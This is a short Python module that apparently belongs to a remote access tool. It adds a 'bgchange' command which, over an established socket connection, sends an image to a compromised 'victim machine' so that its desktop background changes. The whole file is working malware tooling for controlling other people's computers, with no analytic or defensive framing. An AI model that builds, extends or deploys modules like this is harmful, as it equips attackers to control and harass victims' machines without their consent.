from lib.debug import Debug
from lib.helper import ctime
import os
import socket
import tqdm
import time

class module():
    def __init__(self):
        self.Command        = "bgchange"
        self.Name           = "Background Changer"
        self.Description    = """This command changes the background of the victim machine"""
        self.Platform       = "multi"

    def _exec(self, dmos, image_path):
        dmos.conn.send(self.Command.encode())
        time.sleep(1)
        size = socket.htonl(os.path.getsize(image_path))
        dmos.conn.send(size)
        #progress = tqdm.tqdm(range(os.path.getsize(image_path)), f"Sending {image_path}", unit="B", unit_scale=True, unit_divisor=1024)
        with open(image_path, 'rb') as f:
            while 1:
                data = f.read(1024)
                if not data:
                    break
                dmos.conn.send(data)
                #progress.update(len(data))
        f.close()
        Debug.tprint("finished sending image")
